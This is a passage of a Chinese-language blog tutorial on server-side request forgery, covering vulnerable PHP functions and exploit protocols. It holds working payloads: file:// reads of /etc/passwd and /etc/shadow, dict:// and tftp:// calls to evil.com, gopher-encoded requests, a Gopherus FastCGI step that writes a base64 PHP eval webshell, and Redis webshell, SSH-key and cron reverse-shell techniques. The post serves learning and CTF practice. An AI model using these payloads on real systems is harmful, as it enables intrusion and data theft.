<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>SSRF · Mini's blog</title><meta name="description" content="SSRFSSRF(服务端请求伪造) 是一种由攻击者构造请求，诱导服务端发起请求，让目标服务器执行非本意的操作的安全漏洞。
SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>SSRF</a></h3></div><div class="post-content"><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF(服务端请求伪造)</strong> 是一种由攻击者构造请求，诱导服务端发起请求，让目标服务器执行非本意的操作的安全漏洞。</p>
<p>SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul>
<li>服务端提供了从其他服务器应用获取数据的功能（比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载文件等等）</li>
<li>没有对目标地址、文件等做过滤与限制</li>
<li>一般情况下，服务端请求的目标都是与该请求服务器处于同一内网的资源服务</li>
</ul>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul>
<li>内网探测：对内网服务器办公机器进行端口扫描、资产扫描、漏洞扫描</li>
<li>窃取本地和内网敏感数据：如利用file协议</li>
<li>攻击服务器本地或内网应用：利用发现的漏洞，可以进一步发起攻击利用</li>
<li>绕过安全防御：比如防火墙、CDN</li>
</ul>
<h2 id="漏洞的产生"><a href="#漏洞的产生" class="headerlink" title="漏洞的产生"></a>漏洞的产生</h2><ul>
<li>通过url地址分享网页内容功能处</li>
<li>在线翻译</li>
<li>url地址加载或下载图片处</li>
<li>图片、文章收藏功能</li>
<li>云服务器商（它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试）</li>
<li>有远程图片加载的地方</li>
<li>网站采集、网页抓取的地方（一些网站会针对你输入的url进行一些信息采集工作）</li>
<li>头像处（远程加载头像）</li>
<li>邮件系统</li>
<li>编码处理、属性信息处理、文件处理（比如ffpmg，ImageMagick，docx，pdf，xml处理器等）</li>
<li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li>
</ul>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><ul>
<li>寻找可能构成SSRF漏洞的危险函数</li>
</ul>
<h3 id="黑盒测试（未）"><a href="#黑盒测试（未）" class="headerlink" title="黑盒测试（未）"></a>黑盒测试（未）</h3><ul>
<li>观察burpsuit的网站请求消息报文中是否存在URL，并对URL构造payload进行测试</li>
<li>无回显型ssrf的检测需要先配合dnslog平台，测试dnslog平台能否获取到服务器的访问记录，如果没有对应记录，也可能是服务器不出网造成的，利用时可以通过请求响应时间判断内网资产是否存在，然后再利用内网资产漏洞（比如redis以及常见可RCE的web框架）证明漏洞的有效性</li>
</ul>
<h2 id="产生漏洞的常见危险函数"><a href="#产生漏洞的常见危险函数" class="headerlink" title="产生漏洞的常见危险函数"></a>产生漏洞的常见危险函数</h2><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><code>file_get_contents()</code></h3><p>file_get_contents是把文件或url指向的文件写入字符串，当url是内网的文件时，会先去把这个文件的内容读出来再写入，导致了文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="fsockopen-hostname-port-errno-errstr-timeout"><a href="#fsockopen-hostname-port-errno-errstr-timeout" class="headerlink" title="fsockopen($hostname,$port,$errno,$errstr,$timeout)"></a><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code></h3><p>获取用户指定的url（文件或html），这个函数会使用socket跟服务器建立tcp连接或者Unix套接字连接，传输原始数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),</span><br><span class="line">     <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);  </span><br><span class="line">     <span class="keyword">if</span> (!<span class="variable">$fp</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">          <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>    </span><br><span class="line">          <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">          <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>;  <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">          <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">          <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">             <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><code>curl_exec()</code></h3><p>对远程的URL发起请求访问，并将请求的结果返回至前端页面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//  初始化curl连接句柄</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); <span class="comment">//设置连接的URL</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);  <span class="comment">// 设置头文件的信息</span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);   <span class="comment">// 运行curl，请求网页</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  <span class="comment">// 关闭curl连接句柄</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br></pre></td></tr></table></figure>

<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a><code>SoapClient</code></h3><blockquote>
<p>简单对象访问协议（SOAP）是一种轻量、简单、基于 XML 的协议，它被设计在 WEB 上交换结构化的和固化的信息</p>
<p>PHP 的 SoapClient 就是可以基于 SOAP 协议可专门用来访问 WEB 服务的 PHP 客户端。</p>
</blockquote>
<p><code>SoapClient</code> 是一个 php 的内置类，当其进行反序列化时，如果触发了该类中的 <code>__call</code> 方法，那么 <code>__call</code> 便方法可以发送 HTTP 和 HTTPS 请求。该类的构造函数如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure>
<ul>
<li>第一个参数是用来指明是否是wsdl模式</li>
<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP服务 的目标命名空间</li>
</ul>
<h1 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:// -- 本地文件传输协议，主要用于访问本地计算机中的文件</span><br><span class="line">dict:// -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628</span><br><span class="line">sftp:// -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</span><br><span class="line">ldap:// -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</span><br><span class="line">tftp:// -- 一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机</span><br><span class="line">gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息</span><br></pre></td></tr></table></figure>

<h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=file:///etc/passwd</span><br><span class="line">http://example.com/ssrf.php?url=file:///etc/passwd 			Linux用户基本配置信息</span><br><span class="line">http://example.com/ssrf.php?url=file:///c:/windows/win.ini	    windows系统基本配置信息</span><br><span class="line">http://example.com/ssrf.php?url=file:///etc/shadow			Linux用户密码等敏感信息（一般需要root用户才能查看 web服务的一般权限是apache）</span><br><span class="line">http://example.com/ssrf.php?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h2 id="http-s-x2F-x2F"><a href="#http-s-x2F-x2F" class="headerlink" title="http(s):&#x2F;&#x2F;"></a>http(s):&#x2F;&#x2F;</h2><p>可通过服务器发送请求去探测内网存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=http://192.168.52.1</span><br><span class="line">ssrf.php?url=http://192.168.52.6</span><br><span class="line">ssrf.php?url=http://192.168.52.25</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>参数可以通过 burpsuit 的 Intruder 模块进行爆破</p>
<h2 id="dict-x2F-x2F"><a href="#dict-x2F-x2F" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=dict://evil.com:1337/ </span><br><span class="line">dict://127.0.0.1:3360   # 探测 MySQL 服务</span><br><span class="line">dict://127.0.0.1:22/info		# 探测 SSH 服务</span><br><span class="line">dict://127.0.0.1:6379/info		# 探测 redis 服务</span><br><span class="line">dict://127.0.0.1:6379/keys%20*    # 还可以探测 redis 内容</span><br><span class="line">dict://127.0.0.1:1433   # 探测 SQL server 服务</span><br></pre></td></tr></table></figure>

<h2 id="tftp-x2F-x2F"><a href="#tftp-x2F-x2F" class="headerlink" title="tftp:&#x2F;&#x2F;"></a>tftp:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET </span><br></pre></td></tr></table></figure>

<h2 id="gopher-x2F-x2F"><a href="#gopher-x2F-x2F" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h2><blockquote>
<p>Gopher是Internet上一个信息查找系统，它将Internet上的文件组织成某种索引，方便用户从Internet的处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具。使用<strong>tcp 70</strong>端口。但在WWW出现后，Gopher基本过时很少再使用</p>
</blockquote>
<p>所有的WEB服务中间件都支持gopher协议，gopher可以发送任何的TCP数据包</p>
<p>gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp、telnet、Memcache等等，支持发出GET、POST请求</p>
<h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3><ul>
<li>构造 http 数据包</li>
<li>URL 编码，替换回车换行为 %0d%0a（如果用工具转，可能只会有%0a）</li>
<li>‘?’ 号需要转为URL编码 %3f</li>
<li>如果有多个参数，’&amp;’ 也要进行编码</li>
<li>HTTP 包最后加 %0d%0a 代表消息结束</li>
<li>发送 gopher 协议</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.119:2333/_abcd              // 加&#x27;_&#x27; 字符是因为首字符会被吞，所以需要添加r任意一个占位字符</span><br></pre></td></tr></table></figure>

<p>一个GET型的HTTP包，如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/base/get.php?name=Margin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.109</span><br></pre></td></tr></table></figure>
<p>URL编码并改为gopher协议后:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.0.109:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</span><br></pre></td></tr></table></figure>

<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><ul>
<li>有四个参数为必要参数：Content-Type,Content-Length,host,post</li>
<li>Content-Length和POST的参数长度必须一致</li>
<li>如果有多个参数，’&amp;’也要进行编码</li>
<li>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码</li>
<li>回车换行需要使用 %0d%0a 来代替 %0a</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssrf/test/post.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">host:192.168.1.120</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:12</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>Qianxun</span></span><br></pre></td></tr></table></figure>
<p>URL编码并改为gopher协议后:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.1.120:80/_POST%20/ssrf/test/post.php%20HTTP/1.1%0d%0AHost:192.168.1.120%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Qianxun%0d%0A</span><br></pre></td></tr></table></figure>
<p>url解码的样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.1.120:80/_POST /ssrf/test/post.php HTTP/1.1</span><br><span class="line">Host:192.168.1.120</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:11</span><br><span class="line"></span><br><span class="line">name=Qianxun</span><br></pre></td></tr></table></figure>

<h3 id="python脚本构造payload（post和get都适用）"><a href="#python脚本构造payload（post和get都适用）" class="headerlink" title="python脚本构造payload（post和get都适用）"></a>python脚本构造payload（post和get都适用）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">​</span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)   <span class="comment"># 对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result) <span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h3 id="Gopherus"><a href="#Gopherus" class="headerlink" title="Gopherus"></a>Gopherus</h3><p>这个工具使用时需要注意一点，得到的payload要先进行url编码再发包，否则解析过程无法得到预期结果</p>
<h4 id="Gopherus-打-mysql"><a href="#Gopherus-打-mysql" class="headerlink" title="Gopherus 打 mysql"></a>Gopherus 打 mysql</h4><p>MySql 数据库用户认证的过程：MySQL 分为服务端和客户端。MySQL 数据库用户认证采用的是 挑战&#x2F;应答 的方式，即服务器生成该挑战码(scramble)并发送给客户端，客户端用挑战码将自己的密码进行加密后，并将相应的加密结果返回给服务器，服务器本地用挑战码的将用户的密码加密，如果加密的结果和用户返回的加密的结果相同则用户认证成功，从而完成用户认证的过程</p>
<p>mysql 默认端口为 3306，最常用的是打无密码的 mysql</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>

<img src="/2022/10/18/SSRF/mysql.png" class="" title="mysql">

<h4 id="Gopherus-打-FastCGI"><a href="#Gopherus-打-FastCGI" class="headerlink" title="Gopherus 打 FastCGI"></a>Gopherus 打 FastCGI</h4><blockquote>
<p>CGI：是 Web Server 与 Web Application 之间数据交换的一种协议</p>
<p>FastCGI(Fast Common Gateway Interface)：HTTP 协议是浏览器和服务器中间件进行数据交换的协议，类比 HTTP 协议来说，fastcgi 协议则是服务器中间件和某个语言后端（如 PHP-FPM ）进行数据交换的协议</p>
<p>PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，算是 FastCGI 的一个具体实现。额外还提供了相对智能的任务管理功能</p>
</blockquote>
<ul>
<li>多数流行的 HTTP 服务器都支持 FastCGI，包括 Apache、Nginx 和 lightpd</li>
<li>FastCGI 也被许多脚本语言所支持，比较流行的脚本语言之一为 PHP</li>
<li>FastCGI 默认使用端口 9000 来处理请求，特别是在 PHP-FPM（FastCGI Process Manager）中常见</li>
</ul>
<p>攻击 FastCGI 的主要原理就是，在设置环境变量实际请求中会出现一个 <code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code> 这样的键值对，它的意思是 php-fpm 会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制 php-fpm 去执行某个已经存在的文件，不能够实现一些恶意代码的执行</p>
<p>好在 PHP 允许通过 <code>PHP_ADMIN_VALUE</code> 和 <code>PHP_VALUE</code> 去动态修改 PHP 的设置。那么当设置 PHP 环境变量为：<code>auto_prepend_file = php://input;allow_url_include = On</code> 时，就会在执行 PHP 脚本之前包含环境变量 <code>auto_prepend_file</code> 所指向的文件内容 <code>php://input</code> 也就是接收 POST 的内容，这个我们可以在 FastCGI 协议的 body 控制为恶意代码，就在理论上实现了p hp-fpm 任意代码执行的攻击</p>
<ul>
<li><p>如果服务器在配置的时候将9000端口监听在公网上了，可以使用 <strong>fcgi_exp</strong> 工具直接进行攻击测试</p>
</li>
<li><p>利用 Gopherus 生成 payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br><span class="line">/var/www/html/index.php                 //这里输入的是一个已知存在的php文件</span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Gopherus-打-Redis"><a href="#Gopherus-打-Redis" class="headerlink" title="Gopherus 打 Redis"></a>Gopherus 打 Redis</h4><p>Redis 产生漏洞的条件：</p>
<ul>
<li>绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网</li>
<li>没有设置密码认证（一般为空），可以免密码远程登录 redis 服务</li>
</ul>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有采用相关策略（比如添加防火墙规则避免其他非信任来源 ip 访问等），会导致 Redis 服务暴露在公网上。如果在没有设置密码认证（默认为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身提供的 config 命令，可以进行写文件操作，攻击者可以将自己的 ssh 公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而使用对应私钥直接使用 ssh 服务登录目标服务器</p>
<p>SSRF 漏洞中，可以利用 Gopher 协议向目标主机写 <strong>WebShell</strong> 、写 <strong>SSH 公钥</strong> 、创建<strong>计划任务反弹 Shell</strong> 等。其思路都是一样的，就是先将 Redis 的本地数据库存放目录设置为 web 目录、~&#x2F;.ssh 目录或 &#x2F;var&#x2F;spool&#x2F;cron 目录等，然后将 dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行 save 或 bgsave 保存，就可以向指定目录里写入文件了</p>
<blockquote>
